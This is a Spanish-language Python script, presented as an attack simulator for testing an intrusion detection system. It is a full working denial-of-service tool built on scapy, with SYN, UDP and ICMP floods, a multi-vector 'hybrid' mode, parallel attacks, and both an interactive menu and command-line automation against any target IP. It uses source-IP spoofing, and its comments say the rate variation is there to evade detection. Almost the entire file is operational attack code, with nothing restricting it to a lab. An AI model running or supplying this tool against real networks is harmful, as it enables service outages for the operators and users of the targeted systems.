#!/usr/bin/env python3
"""
simulador_ataques_avanzado.py
Simulador de ataques de red para pruebas del IDS Cuántico
Optimizado para generar tráfico de entrenamiento y validación
"""

from scapy.all import IP, TCP, UDP, ICMP, send, RandIP, RandShort
import random
import time
import sys
import threading
import queue
import json
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import argparse

class GeneradorAtaqueAvanzado:
    """Generador de ataques de red con capacidades avanzadas"""
    
    def __init__(self, config_file=None):
        self.paquetes_enviados = 0
        self.errores = 0
        self.ataques_activos = []
        self.cola_eventos = queue.Queue()
        self.logger = self._configurar_logger()
        
        # Configuración por defecto
        self.config = {
            'duracion_base': 10,
            'tasa_base': 100,
            'variabilidad_tasa': 0.3,  # 30% de variación para simular realismo
            'spoofing_ips': True,
            'puertos_comunes': [80, 443, 53, 22, 8080, 3306, 5432]
        }
        
        if config_file:
            self.cargar_configuracion(config_file)
    
    def _configurar_logger(self):
        """Configura logging estructurado para el simulador"""
        logger = logging.getLogger('AtaqueSimulador')
        logger.setLevel(logging.INFO)
        handler = logging.StreamHandler()
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        return logger
    
    def cargar_configuracion(self, archivo):
        """Carga configuración desde archivo JSON"""
        try:
            with open(archivo, 'r') as f:
                self.config.update(json.load(f))
            self.logger.info(f"Configuración cargada desde {archivo}")
        except Exception as e:
            self.logger.error(f"Error cargando configuración: {e}")
    
    def validar_ip(self, ip):
        """Valida formato de IP"""
        partes = ip.split('.')
        if len(partes) != 4:
            return False
        try:
            return all(0 <= int(p) <= 255 for p in partes)
        except:
            return False
    
    def generar_trafico_fondo(self, target_ip, duracion, intensidad):
        """
        Genera tráfico de fondo realista para simular red normal
        Útil para mezclar con tráfico malicioso
        """
        self.logger.info(f"🌐 Generando tráfico de fondo hacia {target_ip}")
        tiempo_fin = time.time() + duracion
        contador = 0
        
        # Tráfico HTTP, DNS y otros comunes
        puertos_web = [80, 443, 8080]
        paquetes_por_segundo = intensidad
        
        try:
            while time.time() < tiempo_fin:
                # Simular navegación web
                if random.random() < 0.6:
                    dport = random.choice(puertos_web)
                    payload = f"GET /{random.randint(1,999)} HTTP/1.1\r\nHost: example.com\r\n\r\n"
                    paquete = IP(dst=target_ip) / TCP(
                        sport=RandShort(),
                        dport=dport,
                        flags='A'
                    ) / payload
                else:
                    # Tráfico DNS
                    paquete = IP(dst=target_ip) / UDP(
                        sport=RandShort(),
                        dport=53
                    ) / random._urandom(random.randint(20, 100))
                
                send(paquete, verbose=False)
                contador += 1
                time.sleep(1.0 / paquetes_por_segundo)
                
        except Exception as e:
            self.logger.error(f"Error en tráfico de fondo: {e}")
        
        self.logger.info(f"✅ Tráfico de fondo completado: {contador} paquetes")
        return contador

    def tcp_syn_flood_avanzado(self, target_ip, target_port=80, duracion=10, 
                               tasa=100, variar_tasa=True, usar_proxies=False):
        """
        TCP SYN Flood con características avanzadas:
        - Variación de tasa para evadir detección
        - Spoofing de IPs
        - Simulación de botnet
        """
        self.logger.info(f"🔥 INICIANDO TCP SYN FLOOD AVANZADO")
        self.logger.info(f"   Target: {target_ip}:{target_port}")
        self.logger.info(f"   Duración: {duracion}s | Tasa base: {tasa} pkt/s")
        
        if not self.validar_ip(target_ip):
            self.logger.error(f"❌ IP inválida: {target_ip}")
            return
        
        # Configurar tasa variable
        if variar_tasa:
            tasa_min = int(tasa * 0.7)
            tasa_max = int(tasa * 1.3)
        else:
            tasa_min = tasa_max = tasa
        
        tiempo_fin = time.time() + duracion
        contador = 0
        tasas_usadas = []
        
        # Lista de puertos de origen para evadir detección
        puertos_fuente = list(range(1024, 65535))
        
        try:
            while time.time() < tiempo_fin:
                # Seleccionar tasa actual (variación)
                tasa_actual = random.randint(tasa_min, tasa_max)
                intervalo = 1.0 / tasa_actual
                tasas_usadas.append(tasa_actual)
                
                # Spoofing de IP origen
                if self.config['spoofing_ips']:
                    src_ip = RandIP()
                else:
                    src_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
                
                src_port = random.choice(puertos_fuente)
                
                # Crear paquete SYN con opciones TCP para más realismo
                opciones_tcp = []
                if random.random() < 0.5:
                    opciones_tcp.append(('MSS', 1460))
                if random.random() < 0.3:
                    opciones_tcp.append(('WScale', 7))
                
                paquete = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=src_port,
                    dport=target_port,
                    flags='S',
                    seq=random.randint(1000, 999999),
                    options=opciones_tcp
                )
                
                send(paquete, verbose=False)
                contador += 1
                
                # Mostrar progreso cada 500 paquetes
                if contador % 500 == 0:
                    tasa_promedio = sum(tasas_usadas[-100:]) / min(100, len(tasas_usadas))
                    self.logger.info(f"   → Enviados {contador} paquetes SYN (tasa actual: {tasa_actual:.0f} pkt/s, prom: {tasa_promedio:.0f})")
                
                time.sleep(intervalo)
                
        except KeyboardInterrupt:
            self.logger.info(f"\n⚠️ Ataque interrumpido por el usuario")
        except Exception as e:
            self.logger.error(f"❌ Error: {e}")
            self.errores += 1
        finally:
            self.paquetes_enviados = contador
            self.logger.info(f"\n✅ TCP SYN Flood completado")
            self.logger.info(f"   Total paquetes: {self.paquetes_enviados}")
            self.logger.info(f"   Tasa promedio: {contador/duracion:.1f} pkt/s")
            return contador
    
    def ataque_hibrido(self, target_ip, duracion=30, intensidad='media'):
        """
        Combina múltiples tipos de ataques para simular un escenario real
        """
        self.logger.info(f"💥 INICIANDO ATAQUE HÍBRIDO (Multi-vector)")
        self.logger.info(f"   Target: {target_ip}")
        self.logger.info(f"   Duración: {duracion}s | Intensidad: {intensidad}")
        
        intensidades = {
            'baja': {'tasa': 50, 'factores': 1},
            'media': {'tasa': 150, 'factores': 2},
            'alta': {'tasa': 300, 'factores': 4}
        }
        
        config = intensidades.get(intensidad, intensidades['media'])
        puertos = [80, 443, 53, 22]  # Múltiples puertos objetivos
        
        tiempo_inicio = time.time()
        tiempo_fin = tiempo_inicio + duracion
        contador_total = 0
        ataques_ejecutados = []
        
        # Dividir el tiempo en fases
        fase_duracion = duracion / 3
        fases = [
            ('TCP_SYN', 0.5, target_ip, 80),
            ('UDP', 0.3, target_ip, 53),
            ('ICMP', 0.2, target_ip, None)
        ]
        
        try:
            for fase, proporcion, ip, puerto in fases:
                tiempo_fase = fase_duracion * proporcion
                self.logger.info(f"   🔹 Fase {fase} - {tiempo_fase:.1f}s")
                
                if fase == 'TCP_SYN':
                    contador = self.tcp_syn_flood_avanzado(
                        target_ip=ip,
                        target_port=puerto,
                        duracion=tiempo_fase,
                        tasa=config['tasa'] * config['factores']
                    )
                elif fase == 'UDP':
                    contador = self.udp_flood(
                        target_ip=ip,
                        target_port=puerto,
                        duracion=tiempo_fase,
                        tasa=config['tasa'] * 0.5
                    )
                elif fase == 'ICMP':
                    contador = self.icmp_flood(
                        target_ip=ip,
                        duracion=tiempo_fase,
                        tasa=config['tasa'] * 0.3
                    )
                
                contador_total += contador
                ataques_ejecutados.append({'fase': fase, 'paquetes': contador})
                
                # Pequeña pausa entre fases
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            self.logger.info(f"\n⚠️ Ataque híbrido interrumpido")
        finally:
            self.logger.info(f"\n✅ Ataque híbrido completado")
            self.logger.info(f"   Total paquetes enviados: {contador_total}")
            for a in ataques_ejecutados:
                self.logger.info(f"   • {a['fase']}: {a['paquetes']} paquetes")
            return contador_total
    
    def udp_flood(self, target_ip, target_port=53, duracion=10, tasa=500):
        """UDP Flood con payloads variables"""
        self.logger.info(f"💧 INICIANDO UDP FLOOD")
        self.logger.info(f"   Target: {target_ip}:{target_port}")
        
        if not self.validar_ip(target_ip):
            self.logger.error(f"❌ IP inválida: {target_ip}")
            return
        
        intervalo = 1.0 / tasa
        tiempo_fin = time.time() + duracion
        contador = 0
        tamanos_payload = list(range(64, 1024, 64))
        
        try:
            while time.time() < tiempo_fin:
                src_ip = RandIP() if self.config['spoofing_ips'] else f"192.168.{random.randint(1,255)}.1"
                dport = target_port
                sport = RandShort()
                
                # Payload con variación de tamaño
                tamano = random.choice(tamanos_payload)
                payload = random._urandom(tamano)
                
                paquete = IP(src=src_ip, dst=target_ip) / UDP(
                    sport=sport,
                    dport=dport
                ) / payload
                
                send(paquete, verbose=False)
                contador += 1
                
                if contador % 500 == 0:
                    self.logger.info(f"   → Enviados {contador} paquetes UDP...")
                
                time.sleep(intervalo)
                
        except KeyboardInterrupt:
            self.logger.info(f"\n⚠️ Ataque interrumpido")
        finally:
            self.paquetes_enviados = contador
            self.logger.info(f"\n✅ UDP Flood completado")
            self.logger.info(f"   Total paquetes: {self.paquetes_enviados}")
            return contador
    
    def icmp_flood(self, target_ip, duracion=10, tasa=500):
        """ICMP Flood con variación de tamaños"""
        self.logger.info(f"⚡ INICIANDO ICMP FLOOD (Ping Flood)")
        self.logger.info(f"   Target: {target_ip}")
        
        if not self.validar_ip(target_ip):
            self.logger.error(f"❌ IP inválida: {target_ip}")
            return
        
        intervalo = 1.0 / tasa
        tiempo_fin = time.time() + duracion
        contador = 0
        tamanos = list(range(56, 1500, 64))
        
        try:
            while time.time() < tiempo_fin:
                src_ip = RandIP() if self.config['spoofing_ips'] else f"192.168.{random.randint(1,255)}.1"
                
                # Tamaño variable
                tamano = random.choice(tamanos)
                paquete = IP(src=src_ip, dst=target_ip) / ICMP(
                    type=8,
                    code=0,
                    id=random.randint(1, 65535),
                    seq=contador
                ) / random._urandom(tamano)
                
                send(paquete, verbose=False)
                contador += 1
                
                if contador % 500 == 0:
                    self.logger.info(f"   → Enviados {contador} paquetes ICMP...")
                
                time.sleep(intervalo)
                
        except KeyboardInterrupt:
            self.logger.info(f"\n⚠️ Ataque interrumpido")
        finally:
            self.paquetes_enviados = contador
            self.logger.info(f"\n✅ ICMP Flood completado")
            self.logger.info(f"   Total paquetes: {self.paquetes_enviados}")
            return contador

class GestorAtaquesParalelos:
    """Gestiona ataques paralelos para pruebas de estrés del IDS"""
    
    def __init__(self, max_trabajadores=4):
        self.max_trabajadores = max_trabajadores
        self.generador = GeneradorAtaqueAvanzado()
        self.resultados = []
        
    def ejecutar_ataques_paralelos(self, lista_ataques):
        """
        Ejecuta múltiples ataques en paralelo
        
        Args:
            lista_ataques: Lista de dict con parámetros de cada ataque
        """
        self.generador.logger.info(f"🚀 Iniciando {len(lista_ataques)} ataques en paralelo")
        self.generador.logger.info(f"   Máximo de trabajadores: {self.max_trabajadores}")
        
        with ThreadPoolExecutor(max_workers=self.max_trabajadores) as executor:
            futuros = []
            
            for ataque in lista_ataques:
                tipo = ataque.get('tipo', 'tcp_syn')
                target_ip = ataque.get('target_ip')
                target_port = ataque.get('target_port', 80)
                duracion = ataque.get('duracion', 10)
                tasa = ataque.get('tasa', 100)
                
                if tipo == 'tcp_syn':
                    futuro = executor.submit(
                        self.generador.tcp_syn_flood_avanzado,
                        target_ip, target_port, duracion, tasa, True
                    )
                elif tipo == 'udp':
                    futuro = executor.submit(
                        self.generador.udp_flood,
                        target_ip, target_port, duracion, tasa
                    )
                elif tipo == 'icmp':
                    futuro = executor.submit(
                        self.generador.icmp_flood,
                        target_ip, duracion, tasa
                    )
                elif tipo == 'hibrido':
                    futuro = executor.submit(
                        self.generador.ataque_hibrido,
                        target_ip, duracion, 'alta'
                    )
                else:
                    self.generador.logger.error(f"Tipo de ataque desconocido: {tipo}")
                    continue
                
                futuros.append(futuro)
            
            # Recoger resultados
            for futuro in futuros:
                try:
                    resultado = futuro.result(timeout=30)
                    self.resultados.append(resultado)
                except Exception as e:
                    self.generador.logger.error(f"Error en ataque paralelo: {e}")
        
        total_paquetes = sum(self.resultados) if self.resultados else 0
        self.generador.logger.info(f"\n📊 RESUMEN ATAQUES PARALELOS")
        self.generador.logger.info(f"   Total paquetes enviados: {total_paquetes}")
        self.generador.logger.info(f"   Ataques completados: {len(self.resultados)}")
        
        return self.resultados

def menu_avanzado():
    """Menú interactivo avanzado"""
    generador = GeneradorAtaqueAvanzado()
    gestor = GestorAtaquesParalelos(max_trabajadores=4)
    
    print("\n" + "="*60)
    print("🚀 SIMULADOR DE ATAQUES AVANZADO - IDS CUÁNTICO")
    print("="*60)
    
    while True:
        print("\n" + "="*60)
        print("📡 MENÚ PRINCIPAL")
        print("="*60)
        print("1. TCP SYN Flood Avanzado (con variación de tasa)")
        print("2. UDP Flood (con payload variable)")
        print("3. ICMP Flood (Ping Flood)")
        print("4. Ataque Híbrido (Multi-vector)")
        print("5. 🚀 Ataques Paralelos (Prueba de estrés)")
        print("6. Generar Tráfico de Fondo")
        print("7. Configurar Parámetros")
        print("8. Salir")
        
        opcion = input("\n👉 Selecciona una opción (1-8): ").strip()
        
        if opcion == '1':
            ip = input("IP objetivo: ")
            puerto = input("Puerto objetivo (default 80): ") or "80"
            duracion = input("Duración en segundos (default 10): ") or "10"
            tasa = input("Paquetes por segundo (default 100): ") or "100"
            
            generador.tcp_syn_flood_avanzado(
                target_ip=ip,
                target_port=int(puerto),
                duracion=int(duracion),
                tasa=int(tasa),
                variar_tasa=True
            )
            
        elif opcion == '2':
            ip = input("IP objetivo: ")
            puerto = input("Puerto objetivo (default 53 - DNS): ") or "53"
            duracion = input("Duración en segundos (default 10): ") or "10"
            tasa = input("Paquetes por segundo (default 500): ") or "500"
            
            generador.udp_flood(
                target_ip=ip,
                target_port=int(puerto),
                duracion=int(duracion),
                tasa=int(tasa)
            )
            
        elif opcion == '3':
            ip = input("IP objetivo: ")
            duracion = input("Duración en segundos (default 10): ") or "10"
            tasa = input("Paquetes por segundo (default 500): ") or "500"
            
            generador.icmp_flood(
                target_ip=ip,
                duracion=int(duracion),
                tasa=int(tasa)
            )
            
        elif opcion == '4':
            ip = input("IP objetivo: ")
            duracion = input("Duración en segundos (default 30): ") or "30"
            intensidad = input("Intensidad (baja/media/alta): ") or "media"
            
            generador.ataque_hibrido(
                target_ip=ip,
                duracion=int(duracion),
                intensidad=intensidad
            )
            
        elif opcion == '5':
            # Ataques paralelos
            ip = input("IP objetivo: ")
            num_ataques = input("Número de ataques paralelos (default 3): ") or "3"
            
            ataques = []
            for i in range(int(num_ataques)):
                # Alternar tipos de ataque
                tipos = ['tcp_syn', 'udp', 'icmp']
                tipo = random.choice(tipos)
                puerto = 80 if tipo == 'tcp_syn' else (53 if tipo == 'udp' else None)
                
                ataques.append({
                    'tipo': tipo,
                    'target_ip': ip,
                    'target_port': puerto or random.randint(1, 1024),
                    'duracion': random.randint(5, 15),
                    'tasa': random.randint(50, 300)
                })
            
            print(f"\n📋 Planificando {len(ataques)} ataques paralelos...")
            for i, a in enumerate(ataques):
                print(f"   {i+1}. {a['tipo'].upper()} -> {a['target_ip']}:{a['target_port']} ({a['duracion']}s)")
            
            confirm = input("\n¿Continuar? (s/n): ")
            if confirm.lower() == 's':
                gestor.ejecutar_ataques_paralelos(ataques)
            
        elif opcion == '6':
            ip = input("IP objetivo (tráfico de fondo): ")
            duracion = input("Duración (default 30s): ") or "30"
            intensidad = input("Intensidad (paquetes/s, default 50): ") or "50"
            
            generador.generar_trafico_fondo(
                target_ip=ip,
                duracion=int(duracion),
                intensidad=int(intensidad)
            )
            
        elif opcion == '7':
            print("\n⚙️ CONFIGURACIÓN ACTUAL:")
            print(f"   Spoofing de IPs: {generador.config['spoofing_ips']}")
            print(f"   Variabilidad de tasa: {generador.config['variabilidad_tasa']}")
            
            cambiar = input("\n¿Cambiar spoofing de IPs? (s/n): ")
            if cambiar.lower() == 's':
                generador.config['spoofing_ips'] = not generador.config['spoofing_ips']
                print(f"   ✅ Spoofing actualizado a: {generador.config['spoofing_ips']}")
            
        elif opcion == '8':
            print("\n👋 Saliendo del simulador avanzado...")
            break
            
        else:
            print("❌ Opción inválida")

def main():
    """Función principal con soporte para línea de comandos"""
    parser = argparse.ArgumentParser(description='Simulador de Ataques para IDS Cuántico')
    parser.add_argument('--modo', choices=['interactivo', 'script'], default='interactivo',
                       help='Modo de ejecución')
    parser.add_argument('--target', help='IP objetivo')
    parser.add_argument('--tipo', choices=['tcp_syn', 'udp', 'icmp', 'hibrido'],
                       help='Tipo de ataque')
    parser.add_argument('--duracion', type=int, default=10, help='Duración en segundos')
    parser.add_argument('--tasa', type=int, default=100, help='Tasa de paquetes/segundo')
    parser.add_argument('--paralelo', type=int, help='Número de ataques paralelos')
    
    args = parser.parse_args()
    
    if args.modo == 'interactivo':
        # Verificar permisos
        import os
        if os.geteuid() != 0:
            print("⚠️ Este script necesita permisos de root para enviar paquetes raw")
            print("   Ejecuta: sudo python3 simulador_ataques_avanzado.py")
            sys.exit(1)
        menu_avanzado()
    else:
        # Modo script para automatización
        generador = GeneradorAtaqueAvanzado()
        
        if not args.target:
            print("❌ En modo script necesitas especificar --target")
            sys.exit(1)
        
        if args.paralelo:
            # Modo paralelo
            gestor = GestorAtaquesParalelos(max_trabajadores=args.paralelo)
            ataques = []
            for i in range(args.paralelo):
                ataques.append({
                    'tipo': args.tipo or random.choice(['tcp_syn', 'udp', 'icmp']),
                    'target_ip': args.target,
                    'target_port': random.randint(1, 1024),
                    'duracion': args.duracion,
                    'tasa': args.tasa
                })
            gestor.ejecutar_ataques_paralelos(ataques)
        else:
            # Ataque único
            if args.tipo == 'tcp_syn':
                generador.tcp_syn_flood_avanzado(args.target, 80, args.duracion, args.tasa)
            elif args.tipo == 'udp':
                generador.udp_flood(args.target, 53, args.duracion, args.tasa)
            elif args.tipo == 'icmp':
                generador.icmp_flood(args.target, args.duracion, args.tasa)
            elif args.tipo == 'hibrido':
                generador.ataque_hibrido(args.target, args.duracion, 'media')
            else:
                print(f"❌ Tipo de ataque no soportado: {args.tipo}")

if __name__ == "__main__":
    main()
